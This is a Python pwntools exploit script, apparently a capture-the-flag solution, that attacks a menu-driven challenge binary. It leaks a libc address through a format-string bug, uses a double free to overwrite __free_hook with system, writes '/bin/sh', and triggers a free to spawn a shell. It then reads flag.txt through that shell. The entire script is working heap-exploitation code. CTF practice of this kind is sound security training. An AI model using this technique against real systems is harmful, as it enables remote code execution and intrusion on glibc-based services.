#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '4101'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
libc = ELF('./libc-2.27.so')
context.binary = binfile

io = remote(HOST, PORT)

def catch(index: int):
    io.sendlineafter(b'command?\n> ', '1')
    io.sendlineafter(b'index?\n> ', str(index))
    io.sendlineafter(b'> ', "bay")

def naming(index: int, data: bytes):
    io.sendlineafter(b'command?\n> ', '2')
    io.sendlineafter(b'index?\n> ', str(index))
    io.sendlineafter(b'name?\n> ', data)

def show(index: int):
    io.sendlineafter(b'command?\n> ', '3')
    io.sendlineafter(b'index?\n> ', str(index))
    return io.readline()

def release(index: int):
    io.sendlineafter(b'command?\n> ', '5')
    io.sendlineafter(b'index?\n> ', str(index))

def dance(index: int):
    io.sendlineafter(b'command?\n> ', '4')
    io.sendlineafter(b'> ', str(index))

catch(0)
naming(0, "%11$p")
libc_base = (int(show(0).decode()[2:-1], 16) - 0xe7 - libc.sym['__libc_start_main'])

catch(1)
release(1)
release(0)

naming(0, pack(libc_base + libc.sym['__free_hook']))
catch(0)
naming(0, b'/bin/sh\0')
catch(1)
naming(1, pack(libc_base + libc.sym['system']))
release(0)

# got shell
io.sendline('echo "hello shell"')
io.recvuntil(b'hello shell\n')

io.sendline('cat flag.txt')
print(io.readline().decode('utf-8', 'ignore'), end='')
io.close()
exit()
